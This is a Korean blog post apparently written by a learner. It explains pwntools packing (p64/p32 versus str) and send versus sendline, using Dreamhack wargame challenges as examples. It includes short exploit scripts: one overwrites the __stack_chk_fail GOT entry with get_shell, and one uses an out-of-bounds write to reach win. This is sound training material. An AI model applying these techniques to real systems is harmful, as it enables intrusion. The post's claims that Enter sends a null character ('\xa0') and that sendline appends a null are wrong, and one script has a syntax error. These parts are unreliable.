<!DOCTYPE html><html lang="ko_KR"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/569ce4b8f30dc480-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/93f479601ee12b01-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" as="image" href="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FCx0D8%2FbtsL2dszNR8%2FVyAXeXDSYkUaeedN9dIG61%2Fimg.png"/><link rel="preload" as="image" href="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FnuGMW%2FbtsL3jlrXzc%2FvZs8lHE3Itp7LDPFfYe5EK%2Fimg.png"/><link rel="stylesheet" href="/_next/static/css/f30152c0704fba31.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/d1a3066c6f88f288.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/574c065e7b12a953.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/d7a30530b49d87ef.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-480bcd007c48fc0c.js"/><script src="/_next/static/chunks/4bd1b696-dc53661a9e7a1ea0.js" async=""></script><script src="/_next/static/chunks/517-17c26c04ca84e5ed.js" async=""></script><script src="/_next/static/chunks/main-app-366924960466ce81.js" async=""></script><script src="/_next/static/chunks/173-e867bd8ccf023a5c.js" async=""></script><script src="/_next/static/chunks/app/layout-119b86139f7d8ac3.js" async=""></script><script src="/_next/static/chunks/app/posts/page-ec37716daf67b3c5.js" async=""></script><meta name="next-size-adjust" content=""/><title>KoGandhi&#x27;s World</title><meta name="description" content="Welcome to visit my place"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="__variable_5cfdac __variable_9a8899 antialiased"><div><div class="header"><div><h1><a href="/">KoGandhi&#x27;s World</a></h1></div><nav class="nav"><ul><li><a href="/about">About</a></li><li><a href="/posts">Posts</a></li></ul></nav></div></div><div class="mainField"><div><div class="content-header"><p class="content-category">Security</p><h1 class="content-title">pwntools - 페이로드 패킹 및 전송</h1><p class="content-date">2025.01.31</p></div><div class="md-content"><p>패킹 때문에 오늘 하루를 꼬박 날려서 정리해둔다<br/>
<!-- -->예전에도 send랑 sendline 때문에 못 풀었던 적이 있어서 같이 정리하기로 했다</p>
<p>pwntools 파이썬 모듈에는 p32, p64 함수가 존재한다<br/>
<!-- -->간단하게 이분법적으로 생각하면 문자열 자체를 입력할 때에는 str() 함수를 사용하고 메모리 주소를 입력할 때에는 p32 또는 p64 함수를 사용한다</p>
<p>근데 이렇게만 생각했다가 오늘 시간을 잡아먹혔기 때문에 무조건적이라 생각하면 안 된다..</p>
<hr/>
<h2><strong>p64 vs p32</strong></h2>
<p>둘 다 패킹 함수이지만 저장할 데이터 크기가 다르다</p>
<h3>p64 </h3>
<p>64비트 즉, 8바이트 패킹에 사용된다<br/>
<!-- -->데이터를 리틀 엔디언으로 변환하는데 주로 64비트 시스템에서 메모리 주소를 조작할 때 사용된다</p>
<pre class="language-c"><code class="language-c"><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0x12345678abcdef01</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token function">print</span><span class="token punctuation">(</span><span class="token function">u64</span><span class="token punctuation">(</span>b<span class="token char">&#x27;\x01\xef\xcd\xab\x78\x56\x34\x12&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<pre class="language-c"><code class="language-c">b<span class="token char">&#x27;\x01\xef\xcd\xab\x78\x56\x34\x12&#x27;</span>
<span class="token number">1311768467750121217</span>
</code></pre>
<p>참고로 <code>e.got[&#x27;printf&#x27;]</code>, <code>e.sym[&#x27;get_shell&#x27;]</code> 등으로 찾은 심볼은 정수 형태이므로 리틀 엔디안으로 입력할 경우 p64 함수로 패킹이 필요하다</p>
<h3>p32</h3>
<p>32비트 즉, 4바이트 데이터 패킹에 사용된다<br/>
<!-- -->리틀 엔디언으로 변환하며 32비트 시스템에서 주로 사용된다</p>
<hr/>
<h2><strong>str vs p64 / p32</strong></h2>
<p><a href="https://dreamhack.io/wargame/challenges/32">https://dreamhack.io/wargame/challenges/32</a></p>
<pre class="language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">long</span> addr<span class="token punctuation">;</span>
    <span class="token keyword">long</span> value<span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Addr : &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">&quot;%ld&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Value : &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">&quot;%ld&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> value<span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>임의의 주소값에 원하는 값을 대입할 수 있는 바이너리이다<br/>
<!-- -->buf 입력을 0x80만큼 받기 때문에 버퍼 오버플로우가 발생할 수도 있어 ret 주소를 get _shell 함수의 주소로 바꾸어 풀이할 수도 있을 것 같다<br/>
<!-- -->system 함수가 실행되도록 movaps도 같이 신경 써주면 풀릴 것 같지만 직접 해보지 않았다..</p>
<hr/>
<p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FCx0D8%2FbtsL2dszNR8%2FVyAXeXDSYkUaeedN9dIG61%2Fimg.png" alt="External Image"/></p>
<p>카나리 값이 어긋나면 __stack_chk_fail 을 호출하기 때문에 __stack_chk_fail의 GOT를 get_shell 주소로 덮어씌워 풀이했다</p>
<hr/>
<pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

port <span class="token operator">=</span> <span class="token number">00000</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&#x27;./ssp_000&#x27;</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&#x27;host1.dreamhack.games&#x27;</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span>
e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&#x27;./ssp_000&#x27;</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token comment"># context.log_level = &#x27;debug&#x27;</span>

payload <span class="token operator">=</span> <span class="token string">b&#x27;A&#x27;</span> <span class="token operator">*</span> <span class="token number">0x4a</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b&#x27;Addr : &#x27;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">&#x27;__stack_chk_fail&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b&#x27;Value : &#x27;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#x27;get_shell&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>메모리 주소는 p64, 문자열 전달은 str이라는 이분법적 사고에 사로잡혀 있어서 못 풀고 있었다..<br/>
<!-- -->본 문제에서는 주소와 값을 %ld로 그대로 전달 받기 때문에 모두 str로 묶어서 별다른 패킹 없이 전달해줘야 한다</p>
<hr/>
<p><a href="https://dreamhack.io/wargame/challenges/1617">https://dreamhack.io/wargame/challenges/1617</a>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&amp;fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FnuGMW%2FbtsL3jlrXzc%2FvZs8lHE3Itp7LDPFfYe5EK%2Fimg.png" alt="External Image"/></p>
<p>Out of Bound로 푸는 문제다</p>
<hr/>
<pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&#x27;./prob&#x27;</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&#x27;host1.dreamhack.games&#x27;</span><span class="token punctuation">,</span> <span class="token number">17260</span><span class="token punctuation">)</span>
e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&#x27;./prob&#x27;</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b&#x27;val: &#x27;</span><span class="token punctuation">,</span> <span class="token string">b&#x27;-15&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b&#x27;val: &#x27;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#x27;win&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>buf의 인덱스에 값이 %lu로 들어가는 것이기에 패킹을 하면 안 된다</p>
<p>바보 같은 나는 메모리 주소는 무조건 패킹이라 생각하고 p64 씌워놓고 왜 안 되지 하면서 무한 삽질 중이었다..<br/>
<!-- -->아무튼 이렇게 값이 어떻게 전달되는지 확실하게 확인하고 패킹을 씌울지 말지 정해야 한다</p>
<hr/>
<h2><strong>send / sendline</strong></h2>
<p>처음 로드맵 따라갈 때 이것 때문에 애를 좀 먹었다<br/>
<!-- -->지금은 잘 알고 쓰고 있지만 그냥 같이 정리해본다</p>
<p>scanf 또는 read 함수 등에 값을 입력할 때 사용자는 입력을 완료하기 위해 엔터를 눌러 널 문자(\xa0)로 문자열의 종료를 알린다<br/>
<!-- -->이때 scanf는 널 문자를 버리지만 read는 널 문자까지 받아버린다</p>
<p>send 함수는 인자 그대로 전송하고, sendline 함수는 인자에 널 문자를 붙여서 보낸다<br/>
<!-- -->그래서 read 함수에 sendline으로 페이로드나 메모리 주소를 전달하면 널 문자가 포함되어 원하는대로 동작이 실행되지 않을 수도 있다<br/>
<!-- -->특히 카나리에 덮어씌울 때 조심해야 한다</p>
<p>이제 막 시스템 해킹 로드맵을 끝내서 후에 예외가 발생할 지는 아직 모르겠지만 현재로서는 read 함수에는 send, scanf 함수에는 sendline을 사용하고 있다</p></div></div></div><div class="footer"><p class="copyright">© 2025 <span>KoGandhi</span>. All rights reserved.</p><p class="build">Built with Next.js &amp; Tailwind CSS</p><p class="design">Designed &amp; Developed by KoGandhi</p><p class="inspire">Inspired by <span class="text-bold">Minecraft</span></p></div><script src="/_next/static/chunks/webpack-480bcd007c48fc0c.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[5915,[\"173\",\"static/chunks/173-e867bd8ccf023a5c.js\",\"177\",\"static/chunks/app/layout-119b86139f7d8ac3.js\"],\"default\"]\n3:I[8173,[\"173\",\"static/chunks/173-e867bd8ccf023a5c.js\",\"530\",\"static/chunks/app/posts/page-ec37716daf67b3c5.js\"],\"\"]\n4:I[2154,[\"173\",\"static/chunks/173-e867bd8ccf023a5c.js\",\"177\",\"static/chunks/app/layout-119b86139f7d8ac3.js\"],\"default\"]\n5:I[5244,[],\"\"]\n6:I[3866,[],\"\"]\n8:I[6213,[],\"OutletBoundary\"]\na:I[6213,[],\"MetadataBoundary\"]\nc:I[6213,[],\"ViewportBoundary\"]\ne:I[4835,[],\"\"]\n:HL[\"/_next/static/media/569ce4b8f30dc480-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/93f479601ee12b01-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/f30152c0704fba31.css\",\"style\"]\n:HL[\"/_next/static/css/d1a3066c6f88f288.css\",\"style\"]\n:HL[\"/_next/static/css/574c065e7b12a953.css\",\"style\"]\n:HL[\"/_next/static/css/d7a30530b49d87ef.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"sPzjG9RZ_q28EVxzJ2MW5\",\"p\":\"\",\"c\":[\"\",\"posts\",\"250131-100\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"posts\",{\"children\":[[\"slug\",\"250131-100\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/f30152c0704fba31.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/d1a3066c6f88f288.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"2\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/574c065e7b12a953.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"ko_KR\",\"children\":[\"$\",\"body\",null,{\"className\":\"__variable_5cfdac __variable_9a8899 antialiased\",\"children\":[[\"$\",\"$L2\",null,{}],[\"$\",\"div\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"header\",\"children\":[[\"$\",\"div\",null,{\"children\":[\"$\",\"h1\",null,{\"children\":[\"$\",\"$L3\",null,{\"href\":\"/\",\"children\":\"KoGandhi's World\"}]}]}],[\"$\",\"nav\",null,{\"className\":\"nav\",\"children\":[\"$\",\"ul\",null,{\"children\":[[\"$\",\"li\",null,{\"children\":[\"$\",\"$L3\",null,{\"href\":\"/about\",\"children\":\"About\"}]}],[\"$\",\"li\",null,{\"children\":[\"$\",\"$L3\",null,{\"href\":\"/posts\",\"children\":\"Posts\"}]}]]}]}]]}]}],[\"$\",\"div\",null,{\"className\":\"mainField\",\"children\":[[\"$\",\"$L4\",null,{}],[\"$\",\"$L5\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L6\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[],[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],[\"$\",\"div\",null,{\"className\":\"footer\",\"children\":[[\"$\",\"p\",null,{\"className\":\"copyright\",\"children\":[\"© 2025 \",[\"$\",\"span\",null,{\"children\":\"KoGandhi\"}],\". All rights reserved.\"]}],[\"$\",\"p\",null,{\"className\":\"build\",\"children\":\"Built with Next.js \u0026 Tailwind CSS\"}],[\"$\",\"p\",null,{\"className\":\"design\",\"children\":\"Designed \u0026 Developed by KoGandhi\"}],[\"$\",\"p\",null,{\"className\":\"inspire\",\"children\":[\"Inspired by \",[\"$\",\"span\",null,{\"className\":\"text-bold\",\"children\":\"Minecraft\"}]]}]]}]]}]}]]}],{\"children\":[\"posts\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L5\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L6\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"slug\",\"250131-100\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L5\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\",\"$0:f:0:1:2:children:2:children:0\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L6\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L7\",[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/d7a30530b49d87ef.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"$L8\",null,{\"children\":\"$L9\"}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"_pvIIHVWj6eHYsSbGcyI2\",{\"children\":[[\"$\",\"$La\",null,{\"children\":\"$Lb\"}],[\"$\",\"$Lc\",null,{\"children\":\"$Ld\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$e\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"7:[\"$\",\"div\",null,{\"children\":[[\"$\",\"div\",null,{\"className\":\"content-header\",\"children\":[[\"$\",\"p\",null,{\"className\":\"content-category\",\"children\":\"Security\"}],[\"$\",\"h1\",null,{\"className\":\"content-title\",\"children\":\"pwntools - 페이로드 패킹 및 전송\"}],[\"$\",\"p\",null,{\"className\":\"content-date\",\"children\":\"2025.01.31\"}]]}],[\"$\",\"div\",null,{\"className\":\"md-content\",\"children\":[[\"$\",\"p\",\"p-0\",{\"children\":[\"패킹 때문에 오늘 하루를 꼬박 날려서 정리해둔다\",[\"$\",\"br\",\"br-0\",{}],\"\\n\",\"예전에도 send랑 sendline 때문에 못 풀었던 적이 있어서 같이 정리하기로 했다\"]}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":[\"pwntools 파이썬 모듈에는 p32, p64 함수가 존재한다\",[\"$\",\"br\",\"br-0\",{}],\"\\n\",\"간단하게 이분법적으로 생각하면 문자열 자체를 입력할 때에는 str() 함수를 사용하고 메모리 주소를 입력할 때에는 p32 또는 p64 함수를 사용한다\"]}],\"\\n\",[\"$\",\"p\",\"p-2\",{\"children\":\"근데 이렇게만 생각했다가 오늘 시간을 잡아먹혔기 때문에 무조건적이라 생각하면 안 된다..\"}],\"\\n\",[\"$\",\"hr\",\"hr-0\",{}],\"\\n\",[\"$\",\"h2\",\"h2-0\",{\"children\":[\"$\",\"strong\",\"strong-0\",{\"children\":\"p64 vs p32\"}]}],\"\\n\",[\"$\",\"p\",\"p-3\",{\"children\":\"둘 다 패킹 함수이지만 저장할 데이터 크기가 다르다\"}],\"\\n\",[\"$\",\"h3\",\"h3-0\",{\"children\":\"p64 \"}],\"\\n\",[\"$\",\"p\",\"p-4\",{\"children\":[\"64비트 즉, 8바이트 패킹에 사용된다\",[\"$\",\"br\",\"br-0\",{}],\"\\n\",\"데이터를 리틀 엔디언으로 변환하는데 주로 64비트 시스템에서 메모리 주소를 조작할 때 사용된다\"]}],\"\\n\",[\"$\",\"pre\",\"pre-0\",{\"className\":\"language-c\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-c\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"token function\",\"children\":\"print\"}],[\"$\",\"span\",\"span-1\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-2\",{\"className\":\"token function\",\"children\":\"p64\"}],[\"$\",\"span\",\"span-3\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-4\",{\"className\":\"token number\",\"children\":\"0x12345678abcdef01\"}],[\"$\",\"span\",\"span-5\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-6\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\n\",[\"$\",\"span\",\"span-7\",{\"className\":\"token function\",\"children\":\"print\"}],[\"$\",\"span\",\"span-8\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-9\",{\"className\":\"token function\",\"children\":\"u64\"}],[\"$\",\"span\",\"span-10\",{\"className\":\"token punctuation\",\"children\":\"(\"}],\"b\",[\"$\",\"span\",\"span-11\",{\"className\":\"token char\",\"children\":\"'\\\\x01\\\\xef\\\\xcd\\\\xab\\\\x78\\\\x56\\\\x34\\\\x12'\"}],[\"$\",\"span\",\"span-12\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-13\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"pre\",\"pre-1\",{\"className\":\"language-c\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-c\",\"children\":[\"b\",[\"$\",\"span\",\"span-0\",{\"className\":\"token char\",\"children\":\"'\\\\x01\\\\xef\\\\xcd\\\\xab\\\\x78\\\\x56\\\\x34\\\\x12'\"}],\"\\n\",[\"$\",\"span\",\"span-1\",{\"className\":\"token number\",\"children\":\"1311768467750121217\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",\"p-5\",{\"children\":[\"참고로 \",[\"$\",\"code\",\"code-0\",{\"children\":\"e.got['printf']\"}],\", \",[\"$\",\"code\",\"code-1\",{\"children\":\"e.sym['get_shell']\"}],\" 등으로 찾은 심볼은 정수 형태이므로 리틀 엔디안으로 입력할 경우 p64 함수로 패킹이 필요하다\"]}],\"\\n\",[\"$\",\"h3\",\"h3-1\",{\"children\":\"p32\"}],\"\\n\",[\"$\",\"p\",\"p-6\",{\"children\":[\"32비트 즉, 4바이트 데이터 패킹에 사용된다\",[\"$\",\"br\",\"br-0\",{}],\"\\n\",\"리틀 엔디언으로 변환하며 32비트 시스템에서 주로 사용된다\"]}],\"\\n\",[\"$\",\"hr\",\"hr-1\",{}],\"\\n\",[\"$\",\"h2\",\"h2-1\",{\"children\":[\"$\",\"strong\",\"strong-0\",{\"children\":\"str vs p64 / p32\"}]}],\"\\n\",[\"$\",\"p\",\"p-7\",{\"children\":[\"$\",\"a\",\"a-0\",{\"href\":\"https://dreamhack.io/wargame/challenges/32\",\"children\":\"https://dreamhack.io/wargame/challenges/32\"}]}],\"\\n\",[\"$\",\"pre\",\"pre-2\",{\"className\":\"language-c\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-c\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"token keyword\",\"children\":\"int\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"token function\",\"children\":\"main\"}],[\"$\",\"span\",\"span-2\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-3\",{\"className\":\"token keyword\",\"children\":\"int\"}],\" argc\",[\"$\",\"span\",\"span-4\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",\"span-5\",{\"className\":\"token keyword\",\"children\":\"char\"}],\" \",[\"$\",\"span\",\"span-6\",{\"className\":\"token operator\",\"children\":\"*\"}],\"argv\",[\"$\",\"span\",\"span-7\",{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",\"span-8\",{\"className\":\"token punctuation\",\"children\":\"]\"}],[\"$\",\"span\",\"span-9\",{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",\"span-10\",{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n    \",[\"$\",\"span\",\"span-11\",{\"className\":\"token keyword\",\"children\":\"long\"}],\" addr\",[\"$\",\"span\",\"span-12\",{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n    \",[\"$\",\"span\",\"span-13\",{\"className\":\"token keyword\",\"children\":\"long\"}],\" value\",[\"$\",\"span\",\"span-14\",{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n    \",[\"$\",\"span\",\"span-15\",{\"className\":\"token keyword\",\"children\":\"char\"}],\" buf\",[\"$\",\"span\",\"span-16\",{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",\"span-17\",{\"className\":\"token number\",\"children\":\"0x40\"}],[\"$\",\"span\",\"span-18\",{\"className\":\"token punctuation\",\"children\":\"]\"}],\" \",[\"$\",\"span\",\"span-19\",{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",\"span-20\",{\"className\":\"token punctuation\",\"children\":\"{\"}],[\"$\",\"span\",\"span-21\",{\"className\":\"token punctuation\",\"children\":\"}\"}],[\"$\",\"span\",\"span-22\",{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\\n    \",[\"$\",\"span\",\"span-23\",{\"className\":\"token function\",\"children\":\"initialize\"}],[\"$\",\"span\",\"span-24\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-25\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-26\",{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\\n\\n    \",[\"$\",\"span\",\"span-27\",{\"className\":\"token function\",\"children\":\"read\"}],[\"$\",\"span\",\"span-28\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-29\",{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",\"span-30\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" buf\",[\"$\",\"span\",\"span-31\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",\"span-32\",{\"className\":\"token number\",\"children\":\"0x80\"}],[\"$\",\"span\",\"span-33\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-34\",{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\\n    \",[\"$\",\"span\",\"span-35\",{\"className\":\"token function\",\"children\":\"printf\"}],[\"$\",\"span\",\"span-36\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-37\",{\"className\":\"token string\",\"children\":\"\\\"Addr : 